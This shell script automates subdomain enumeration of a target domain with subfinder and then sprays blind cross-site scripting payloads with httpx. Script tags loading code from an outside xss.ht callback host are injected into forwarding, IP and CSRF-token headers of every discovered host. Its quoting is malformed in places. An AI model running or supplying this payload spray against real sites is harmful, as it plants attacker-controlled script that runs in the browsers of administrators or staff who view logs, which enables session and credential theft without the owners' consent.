#!/bin/sh
#install subfinder
docker pull projectdiscovery/subfinder
sleep 1

#alias subfinder
alias subfinder='docker run -it --rm -w /data -v $(pwd):/data projectdiscovery/subfinder'
sleep 1

#install httpx
docker pull projectdiscovery/httpx
sleep 1

#alias httpx
alias httpx='docker run -it --rm -w /data -v $(pwd):/data projectdiscovery/httpx'

sleep 1

echo "subfinder & httpx  successfully installs "


#enumeration subdomain
subfinder -d $1 -silent >> $1subdomain.txt
 sleep 1

wc -l <  $1subdomain.txt 
 echo "enumeration subdomain  successfully  " 
sleep 1


#blindxss


httpx -l $1subdomain.txt -H "X-Forwarded-for: "><script src=https://husseinphp23.xss.ht></script>" -H "X-forwarded-ip: "><script src=https://husseinphp23.xss.ht></script>" -H "cf-connecting-ip: "><script src=https://husseinphp23.xss.ht></script>"

sleep 1

httpx -l $1subdomain.txt  -H "X-Client-ip: "><script src=https://husseinphp23.xss.ht></script>" -H "X-real-ip: "><script src=https://husseinphp23.xss.ht></script>" -H "X-request-uri: "><script src=https://husseinphp23.xss.ht></script>" \  -H "X-XSRF-TOKEN: "><script src=https://husseinphp23.xss.ht></script>" -H "X-CSRF-TOKEN: "><script src=https://husseinphp23.xss.ht></script>"


 echo " BLIND XSS  successfully  " 
